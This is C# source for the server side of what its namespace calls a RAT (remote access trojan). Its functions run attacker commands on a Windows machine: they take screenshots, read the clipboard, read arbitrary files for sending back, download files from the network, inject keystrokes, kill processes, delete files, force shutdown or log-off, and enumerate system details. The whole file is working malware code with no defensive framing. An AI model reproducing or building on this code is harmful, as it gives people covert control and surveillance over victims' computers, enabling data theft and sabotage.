using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Windows.Forms;
using System.ServiceProcess;
using System.Drawing;

namespace RATServer
{
    public class Functions
    {
        public static Response Message(string Msg)
        {
            Response r = new Response { Type = "Message" };
            try
            {
                MessageBox.Show(Msg);
                r.Msg = "Message Success";
            } catch (Exception e) { r.Msg = e.Message; }          
            return r;
        }
        public static Response Run(string Path)
        {
            Response r = new Response { Type = "Message" };
            try
            {
                Process.Start(Path);        
                r.Msg = "Run Success";
            } catch (Exception e) { r.Msg = e.Message; }            
            return r;
        }
        public static Response PCInfo()
        {
            Response r = new Response { Type = "Message" };
            try
            {
                r.Msg = "Details" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "Machine Name: " + Environment.MachineName + Environment.NewLine + "OS: " + Environment.OSVersion.ToString() + Environment.NewLine + "UserDomainName: " + Environment.UserDomainName + Environment.NewLine + "Directory: " + Environment.CurrentDirectory;
            }
            catch (Exception e) { r.Msg = e.Message; }
            return r;
        }
        public static Response Processes()
        {
            Response r = new Response { Type = "Message" };
            try
            {
                foreach (Process p in Process.GetProcesses()) r.Msg += p.ProcessName + Environment.NewLine;
            }
            catch (Exception e) { r.Msg = e.Message; }          
            return r;
        }
        public static Response TaskKill(string Name)
        {
            Response r = new Response { Type = "Message" };
            try
            {
                foreach (Process p in Process.GetProcessesByName(Name)) p.Kill();
                r.Msg = "Task Kill Success";
            }
            catch (Exception e) { r.Msg = e.Message; }
            return r;
        }
        public static Response Delete(string Path)
        {
            Response r = new Response { Type = "Message" };
            try
            {
                if (File.Exists(Path))
                {
                    File.Delete(Path);
                    r.Msg = "Delete Success";
                } else r.Msg = "File Not Found";
            }
            catch (Exception e) { r.Msg = e.Message; }
            return r;
        }
        public static Response Download(string IP, string Path)
        {
            Response r = new Response { Type = "Message" };
            try
            {
                using (var c = new WebClient()) c.DownloadFile(IP, Path);
                r.Msg = "Download Success";
            }
            catch (Exception e) { r.Msg = e.Message; }
            return r;
        }
        public static Response ShutDown()
        {
            Response r = new Response { Type = "Message" };
            try
            {
                Process.Start("cmd.exe shutdown -s -f -t 00");
                r.Msg = "Shutdown Success";
            }
            catch (Exception e) { r.Msg = e.Message; }
            return r;
        }
        public static Response Restart()
        {
            Response r = new Response { Type = "Message" };
            try
            {
                Process.Start("cmd.exe shutdown -r -f -t 00");
                r.Msg = "Restart Success";
            }
            catch (Exception e) { r.Msg = e.Message; }
            return r;
        }
        public static Response LogOff()
        {
            Response r = new Response { Type = "Message" };
            try
            {
                Process.Start("cmd.exe shutdown -l -f");
                r.Msg = "Log Off Success";
            }
            catch (Exception e) { r.Msg = e.Message; }
            return r;
        }
        public static Response ClipBoard()
        {
            Response r = new Response { Type = "Message" };
            try
            {
                r.Msg = Clipboard.GetText();
            }
            catch (Exception e) { r.Msg = e.Message; }          
            return r;
        }
        public static Response KeyPress(string Keys)
        {
            Response r = new Response { Type = "Message" };
            try
            {
                SendKeys.SendWait(Keys);
                r.Msg = "SendKeys Success";                
            }
            catch (Exception e) { r.Msg = e.Message; }
            return r;
        }
        public static Response Retrieve(string Dir)
        {
            Response r = new Response { Type = "Data" };
            try
            {
                r.Msg = Path.GetFileName(Dir);
                r.Data = File.ReadAllBytes(Dir);
            }
            catch (Exception e) { r.Msg = e.Message; r.Data = new byte[0]; }
            return r;
        }
        public static Response Services()
        {
            Response r = new Response { Type = "Message" };
            try
            {
                ServiceController[] sc = ServiceController.GetServices();
                foreach (ServiceController s in sc) r.Msg += s.DisplayName + Environment.NewLine;
            }
            catch (Exception e) { r.Msg = e.Message; }
            return r;
        }
        public static Response Search(string Path)
        {
            Response r = new Response { Type = "Message" };
            try
            {
                Process p = new Process();
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.Arguments = "/c dir " + Path;
                p.Start();
                r.Msg = p.StandardOutput.ReadToEnd();
                p.WaitForExit();
            }
            catch (Exception e) { r.Msg = e.Message; }
            return r;
        }
        public static Response ScreenShot()
        {
            Response r = new Response { Type = "Data" };
            try
            {
                int width = 1920;
                int height = 1080;
                using (Bitmap bitmap = new Bitmap(width, height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap)) g.CopyFromScreen(0, 0, 0, 0, new Size(width, height));
                    r.Msg = "screenshot.png";
                    ImageConverter converter = new ImageConverter();
                    r.Data = (byte[])converter.ConvertTo(bitmap, typeof(byte[]));
                }
            }
            catch (Exception e) { r.Msg = e.Message; r.Data = new byte[0]; }
            return r;
        }
        public static Response Software()
        {
            Response r = new Response { Type = "Message" };
            try
            {
                Process p = new Process();
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.FileName = "powershell.exe";
                p.StartInfo.Arguments = $"-Command \"Get-WmiObject -Class Win32_Product|select Name, Version\"";
                p.Start();
                r.Msg = p.StandardOutput.ReadToEnd();
                p.WaitForExit();
            }
            catch (Exception e) { r.Msg = e.Message; }        
            return r;
        }
        public static Response IPConfig()
        {
            Response r = new Response { Type = "Message" };
            try
            {
                Process p = new Process();
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.Arguments = "/c ipconfig";
                p.Start();
                r.Msg = p.StandardOutput.ReadToEnd();
                p.WaitForExit();
            }
            catch (Exception e) { r.Msg = e.Message; }
            return r;
        }
    }
}